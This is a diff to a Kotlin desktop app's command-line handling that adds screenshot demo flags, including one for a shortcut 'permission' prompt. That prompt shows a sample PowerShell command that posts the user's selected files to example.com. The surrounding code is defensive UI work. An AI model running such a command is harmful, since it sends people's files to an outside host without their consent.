@@ -136,6 +136,15 @@ fun main(args: Array<String>) {
             args.firstOrNull { it.startsWith("--keymap=") }?.let { s.openKeymap(it.substringAfter('=')) }
             if ("--flows" in args) s.flowsOpen = true
             args.firstOrNull { it.startsWith("--flows=") }?.let { s.flowsInitial = it.substringAfter('='); s.flowsOpen = true }
+            // --flows-draft-demo: the dialog reopened on a shortcut with unsaved edits (they survive a run).
+            if ("--flows-draft-demo" in args) FlowStore.samples().first { it.id == "builtin:hash" }.let { f ->
+                s.flowDrafts[f.id] = f.copy(name = f.name + " (draft)", steps = f.steps + FlowStep("debug.show")); s.flowsInitial = f.id; s.flowsOpen = true
+            }
+            // --permission-demo: the question an untrusted shortcut asks before a script (FlowSafety.kt).
+            if ("--permission-demo" in args) s.flowPrompt = FlowPrompt("permission",
+                if (S.zh) "「範例」不是受信任的捷徑，想要執行程式或傳送資料" else "\"Sample\" isn't a trusted shortcut and wants to run a program or send data",
+                listOf(if (S.zh) "允許這一步" else "Allow this step", if (S.zh) "信任這個捷徑" else "Trust this shortcut"),
+                "執行指令碼 (shell.run)\npowershell:\nInvoke-WebRequest https://example.com -Method Post -InFile \$env:FILES_ITEMS", kotlinx.coroutines.CompletableDeferred())
             if ("--delete-report" in args) s.deleteReport = DeleteReport(0, listOf(System.getProperty("user.home") + "\\example-folder"), emptyList())
             args.firstOrNull { it.startsWith("--search=") }?.let { q -> s.scope.launch { delay(1200.milliseconds); s.searchDeep(q.substringAfter('=')) } }
             // --batch-rename / --edit-meta: the dialogs for every item in the folder (preview only in screenshots).
